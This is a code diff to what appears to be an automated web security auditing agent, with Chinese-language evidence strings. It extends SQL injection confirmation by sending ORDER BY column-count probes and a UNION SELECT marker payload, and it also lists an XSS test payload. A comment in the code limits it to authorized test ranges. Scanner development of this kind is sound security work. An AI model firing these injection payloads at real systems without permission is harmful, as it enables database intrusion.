@@ -32,6 +32,7 @@ SQL_ERROR_PATTERNS = [
     r"ora-\d{5}",
     r"postgresql.*error",
     r"sqlite.*error",
+    r"unknown column",
     r"unclosed quotation mark",
     r"quoted string not properly terminated",
 ]
@@ -307,6 +308,13 @@ class AuditorAgent:
             self._last_probe_failed = True
             return None
         if quote_probe and self._has_sql_error(quote_probe.get("body", "")):
+            followup = self._sqli_error_followup(url, param, context_params)
+            payloads = ["1'", *followup.get("payloads", [])]
+            evidence = "单引号 payload 触发了数据库错误特征。"
+            if followup.get("column_count"):
+                evidence += f" ORDER BY 探测推测列数为 {followup['column_count']}。"
+            if followup.get("union_marker_reflected"):
+                evidence += " UNION SELECT 标记在响应中回显，说明可继续做联合查询型验证。"
             return self._finding(
                 self._new_id("SQLI", finding_index),
                 "确认存在 SQL 注入错误回显",
@@ -314,10 +322,13 @@ class AuditorAgent:
                 "High",
                 "sqli",
                 quote_probe["url"],
-                "单引号 payload 触发了数据库错误特征。",
-                payloads=["1'"],
+                evidence,
+                payloads=payloads,
                 status=STATUS_CONFIRMED,
-                request_response=self._evidence_block(quote_probe, matched="SQL error pattern"),
+                request_response={
+                    "error_probe": self._evidence_block(quote_probe, matched="SQL error pattern"),
+                    "followup": followup,
+                },
             )
 
         payload_pairs = [
@@ -352,6 +363,63 @@ class AuditorAgent:
                         },
                     )
         return None
+
+    def _sqli_error_followup(self, url: str, param: str, context_params: dict) -> dict:
+        payloads: list[str] = []
+        order_by: list[dict] = []
+        column_count = 0
+        first_error_column = 0
+
+        for column in range(1, 9):
+            payload = f"1' ORDER BY {column}-- "
+            response = self._http_get(self._mutate_url(url, param, payload, context_params))
+            if not response:
+                break
+            payloads.append(payload)
+            has_error = self._has_sql_error(response.get("body", ""))
+            order_by.append(
+                {
+                    "payload": payload,
+                    "status_code": response.get("status_code"),
+                    "body_length": response.get("body_length"),
+                    "sql_error": has_error,
+                }
+            )
+            if has_error:
+                first_error_column = column
+                break
+            column_count = column
+
+        if first_error_column > 1:
+            column_count = first_error_column - 1
+
+        union_probe = {}
+        union_marker_reflected = False
+        if column_count > 0:
+            markers = [f"NOVA{index}" for index in range(1, column_count + 1)]
+            select_list = ",".join(f"'{marker}'" for marker in markers)
+            union_payload = f"-1' UNION SELECT {select_list}-- "
+            response = self._http_get(self._mutate_url(url, param, union_payload, context_params))
+            payloads.append(union_payload)
+            if response:
+                body = response.get("body", "")
+                reflected = [marker for marker in markers if marker in body]
+                union_marker_reflected = bool(reflected)
+                union_probe = {
+                    "payload": union_payload,
+                    "status_code": response.get("status_code"),
+                    "body_length": response.get("body_length"),
+                    "reflected_markers": reflected,
+                }
+
+        return {
+            "payloads": payloads,
+            "order_by": order_by,
+            "column_count": column_count,
+            "union_probe": union_probe,
+            "union_marker_reflected": union_marker_reflected,
+            "note": "后续 payload 仅用于授权靶场的错误回显、列数和 UNION 回显点验证。",
+        }
 
     def _probe_reflection(self, url: str, param: str, context_params: dict, finding_index: int) -> dict | None:
         payloads = [("xss", "<script>alert(1)</script>")]
